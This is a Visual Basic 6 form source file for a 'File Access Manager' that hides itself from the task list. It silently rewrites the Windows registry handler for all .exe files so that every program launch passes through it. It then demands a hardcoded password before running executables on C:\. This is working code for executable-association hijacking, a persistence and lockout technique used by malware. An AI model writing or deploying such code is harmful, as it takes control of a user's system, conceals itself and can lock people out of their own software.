VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   2835
   ClientLeft      =   15
   ClientTop       =   15
   ClientWidth     =   5340
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2835
   ScaleWidth      =   5340
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.PictureBox Picture3 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      ForeColor       =   &H80000008&
      Height          =   555
      Left            =   4410
      ScaleHeight     =   35
      ScaleMode       =   3  'Pixel
      ScaleWidth      =   37
      TabIndex        =   9
      Top             =   210
      Width           =   585
   End
   Begin VB.PictureBox Picture2 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      ForeColor       =   &H80000008&
      Height          =   555
      Left            =   3780
      ScaleHeight     =   35
      ScaleMode       =   3  'Pixel
      ScaleWidth      =   35
      TabIndex        =   8
      Top             =   210
      Width           =   555
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "File Access Manager"
      Height          =   2685
      Left            =   300
      TabIndex        =   1
      Top             =   60
      Width           =   4965
      Begin VB.CommandButton Command2 
         Caption         =   "&Cancel"
         Height          =   345
         Left            =   2430
         TabIndex        =   7
         Top             =   2190
         Width           =   1095
      End
      Begin VB.CommandButton Command1 
         Caption         =   "&Ok"
         Height          =   345
         Left            =   1080
         TabIndex        =   6
         Top             =   2190
         Width           =   1095
      End
      Begin VB.TextBox Text1 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Marlett"
            Size            =   8.25
            Charset         =   2
            Weight          =   500
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         IMEMode         =   3  'DISABLE
         Left            =   120
         PasswordChar    =   "h"
         TabIndex        =   5
         Text            =   "Password"
         Top             =   1740
         Width           =   4665
      End
      Begin VB.Label Label3 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Enter Password To Access File:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   120
         TabIndex        =   4
         Top             =   1530
         Width           =   2715
      End
      Begin VB.Label Label2 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         BorderStyle     =   1  'Fixed Single
         Caption         =   """%1"" %*"
         ForeColor       =   &H80000008&
         Height          =   765
         Left            =   120
         TabIndex        =   3
         Top             =   750
         Width           =   4665
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "You Have Attempted To Access A Protected File:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   405
         Left            =   120
         TabIndex        =   2
         Top             =   300
         Width           =   3405
      End
   End
   Begin VB.PictureBox Picture1 
      Align           =   3  'Align Left
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2835
      Left            =   0
      Picture         =   "Form1.frx":1E72
      ScaleHeight     =   2835
      ScaleWidth      =   225
      TabIndex        =   0
      Top             =   0
      Width           =   225
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()

If Text1.Text = "ownpassword" Then
Shell Command$
Unload Me
End
End If

End Sub

Private Sub Command2_Click()
Unload Me
End
End Sub

Private Sub Form_Load()
On Error Resume Next '//just in case file is run with no paramters or first run install
Dim FileName As String
App.TaskVisible = False '//hide from task manager

'make sure still in registry
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
Reg.RegWrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\", App.Path & "\" & App.EXEName & ".exe " & Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)


'extract file name from run parameters
FileName = Mid(Command$, 2, Len(Command$) - 3)



'To Protect all exe files in C:\ drive
If InStr(1, LCase(Command$), "c:\") > 0 Then
Me.Visible = True
Label2.Caption = Command$
hImgSmall& = SHGetFileInfo(FileName$, 0&, shinfo, Len(shinfo), BASIC_SHGFI_FLAGS Or SHGFI_SMALLICON)
hImgLarge& = SHGetFileInfo(FileName$, 0&, shinfo, Len(shinfo), BASIC_SHGFI_FLAGS Or SHGFI_LARGEICON)
r& = ImageList_Draw(hImgSmall&, shinfo.iIcon, Picture2.hDC, 0, 0, ILD_TRANSPARENT)
r& = ImageList_Draw(hImgLarge&, shinfo.iIcon, Picture3.hDC, 0, 0, ILD_TRANSPARENT)
Picture2.Refresh
Picture3.Refresh
Else
Shell Command$, vbNormalFocus
Unload Me
End
End If
























'// just as easy to add extra files e.g  change c:\ to reg,ms, eg
'If InStr(1, LCase(Command$), "c:\") > 0 Then
'Me.Visible = True
'Label2.Caption = Command$
'hImgSmall& = SHGetFileInfo(FileName$, 0&, shinfo, Len(shinfo), BASIC_SHGFI_FLAGS Or SHGFI_SMALLICON)
'hImgLarge& = SHGetFileInfo(FileName$, 0&, shinfo, Len(shinfo), BASIC_SHGFI_FLAGS Or SHGFI_LARGEICON)
'r& = ImageList_Draw(hImgSmall&, shinfo.iIcon, Picture2.hDC, 0, 0, ILD_TRANSPARENT)
'r& = ImageList_Draw(hImgLarge&, shinfo.iIcon, Picture3.hDC, 0, 0, ILD_TRANSPARENT)
'Picture2.Refresh
'Picture3.Refresh
'Else
'Shell Command$, vbNormalFocus
'End If










End Sub
